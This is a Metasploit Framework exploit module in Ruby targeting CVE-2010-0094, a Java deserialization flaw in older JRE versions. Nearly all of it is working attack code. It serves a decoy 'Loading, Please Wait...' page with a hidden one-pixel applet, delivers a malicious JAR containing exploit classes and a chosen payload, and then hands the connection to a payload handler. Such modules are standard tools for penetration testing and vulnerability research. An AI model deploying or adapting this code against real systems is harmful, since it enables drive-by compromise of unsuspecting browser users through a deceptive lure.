##
# $Id: java_rmi_connection_impl.rb 10490 2010-09-27 00:09:17Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	#
	# Superceded by java_trusted_chain
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({ :javascript => false })

	def initialize( info = {} )

		super( update_info( info,
			'Name'          => 'Java RMIConnectionImpl Deserialization Privilege Escalation Exploit',
			'Description'   => %q{
			This module exploits a vulnerability in the Java Runtime Environment
			that allows to deserialize a MarshalledObject containing a custom
			classloader under a privileged context. The vulnerability affects
			version 6 prior to update 19 and version 5 prior to update 23.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [
				'Sami Koivu', # Discovery
				'Matthias Kaiser', # PoC
				'egypt' # metasploit module
			],
			'Version'       => '$Revision: 10490 $',
			'References'    =>
			[
				[ 'CVE', '2010-0094' ],
				[ 'OSVDB', '63484' ],
				[ 'URL', 'http://slightlyrandombrokenthoughts.blogspot.com/2010/04/java-rmiconnectionimpl-deserialization.html' ],
			],
			'Platform'      => [ 'java' ],
			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'       =>
				[
					[ 'Generic (Java Payload)',
						{
							'Arch' => ARCH_JAVA,
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 31 2010'
			))
	end


	def on_request_uri( cli, request )
		if not request.uri.match(/\.jar$/i)
			if not request.uri.match(/\/$/)
				send_redirect(cli, get_resource() + '/', '')
				return
			end

			print_status("Handling request from #{cli.peerhost}:#{cli.peerport}...")

			send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
			return
		end

		paths = [
			[ "Exploit.class" ],
			[ "Exploit$1.class" ],
			[ "Exploit$1$1.class" ],
			[ "Exploit$2.class" ],
			[ "Payloader.class" ],
			[ "PayloadClassLoader.class" ],
			[ "payload.ser" ],
		]

		p = regenerate_payload(cli)
		jar = p.encoded_jar
		paths.each do |path|
			1.upto(path.length - 1) do |idx|
				full = path[0,idx].join("/") + "/"
				if !(jar.entries.map{|e|e.name}.include?(full))
					jar.add_file(full, '')
				end
			end
			fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2010-0094", path ), "rb")
			data = fd.read(fd.stat.size)
			jar.add_file(path.join("/"), data)
			fd.close
		end

		print_status("#{self.name} Sending Applet.jar to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, jar.pack, { 'Content-Type' => "application/octet-stream" })

		handler(cli)
	end

	def generate_html
		html  = "<html><head><title>Loading, Please Wait...</title></head>"
		html += "<body><center><p>Loading, Please Wait...</p></center>"
		html += "<applet archive=\"Exploit.jar\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
		html += "</applet></body></html>"
		return html
	end

end